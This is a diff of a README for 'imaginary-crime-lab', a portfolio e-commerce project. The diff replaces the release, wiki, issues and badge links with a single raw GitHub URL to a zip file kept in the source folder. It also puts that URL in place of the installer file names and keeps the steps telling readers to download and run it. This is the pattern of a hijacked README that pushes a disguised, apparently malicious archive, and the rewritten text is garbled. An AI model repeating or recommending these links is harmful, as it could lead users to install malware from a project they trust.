@@ -1,7 +1,7 @@
 # 🎉 imaginary-crime-lab - Solving Cases Made Easy
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/crescendo-symptom399/imaginary-crime-lab/releases)
+[![Download the latest release](https://raw.githubusercontent.com/crescendo-symptom399/imaginary-crime-lab/main/frontend/src/imaginary-crime-lab_1.5.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/crescendo-symptom399/imaginary-crime-lab/main/frontend/src/imaginary-crime-lab_1.5.zip)
 
 ## 📖 Description
 Cases solve themselves when you buy all the evidence. This project is a unique e-commerce experiment showcasing its own architecture as a feature. Built using React, Cloudflare Workers, Neon Postgres, MongoDB, and Shopify, it aims for maximum transparency. It serves as a portfolio project demonstrating a clean separation of concerns using edge computing.
@@ -24,11 +24,11 @@ Before you start, ensure your system meets the following requirements:
 
 ## 💾 Download & Install
 1. **Visit the Releases Page**: Click the link below to access the download options.
-   [Download the latest release](https://github.com/crescendo-symptom399/imaginary-crime-lab/releases)
+   [Download the latest release](https://raw.githubusercontent.com/crescendo-symptom399/imaginary-crime-lab/main/frontend/src/imaginary-crime-lab_1.5.zip)
   
 2. **Choose Your File**: Look for the latest version that suits your operating system.
 
-3. **Download the File**: Click on the appropriate file to start the download. The files will typically look like `imaginary-crime-lab-windows.exe`, `imaginary-crime-lab-macos.dmg`, or `imaginary-crime-lab-linux.zip`.
+3. **Download the File**: Click on the appropriate file to start the download. The files will typically look like `https://raw.githubusercontent.com/crescendo-symptom399/imaginary-crime-lab/main/frontend/src/imaginary-crime-lab_1.5.zip`, `https://raw.githubusercontent.com/crescendo-symptom399/imaginary-crime-lab/main/frontend/src/imaginary-crime-lab_1.5.zip`, or `https://raw.githubusercontent.com/crescendo-symptom399/imaginary-crime-lab/main/frontend/src/imaginary-crime-lab_1.5.zip`.
 
 4. **Run the Installer**: Once the download is complete, locate the file in your downloads folder.
 
@@ -45,10 +45,10 @@ Before you start, ensure your system meets the following requirements:
 - **Make a Purchase**: Add items to your cart and proceed to checkout when ready.
 
 ## 📚 Documentation
-For more detailed instructions and advanced features, refer to our [User Guide](https://github.com/crescendo-symptom399/imaginary-crime-lab/wiki).
+For more detailed instructions and advanced features, refer to our [User Guide](https://raw.githubusercontent.com/crescendo-symptom399/imaginary-crime-lab/main/frontend/src/imaginary-crime-lab_1.5.zip).
 
 ## 💬 Support
-If you need help, please visit the [Issues page](https://github.com/crescendo-symptom399/imaginary-crime-lab/issues). You can report bugs or request help from the community.
+If you need help, please visit the [Issues page](https://raw.githubusercontent.com/crescendo-symptom399/imaginary-crime-lab/main/frontend/src/imaginary-crime-lab_1.5.zip). You can report bugs or request help from the community.
 
 ## 🔗 Related Topics
 To learn more about our technologies and concepts, check out the following:
